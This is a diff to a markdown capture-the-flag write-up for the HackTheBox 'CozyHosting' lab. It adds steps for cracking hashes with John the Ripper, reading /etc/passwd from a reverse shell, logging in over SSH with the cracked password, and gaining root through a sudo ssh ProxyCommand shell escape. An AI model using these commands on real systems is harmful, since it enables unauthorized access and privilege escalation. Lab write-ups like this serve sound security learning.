@@ -91,4 +91,19 @@ We save them in a hash.txt file and proceed to decrypt the hashes with the John 
 ```
 john --wordlist=$HOME/rockyou.txt hash.txt
 ```
-#### to be continued... 
+Now to know who the admin is, just execute from the reverse shell:
+```
+cat /etc/passwd
+```
+and we log in to the system
+```
+ssh josh@cozyhosting.htb
+# we access using the password of the decrypted hash
+```
+and we get the first flag *user.txt*
+## privilege scale
+To escalate privileges and obtain the last *root.txt* flag, simply execute the following commands
+```
+sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+cat /root/root.txt
+```
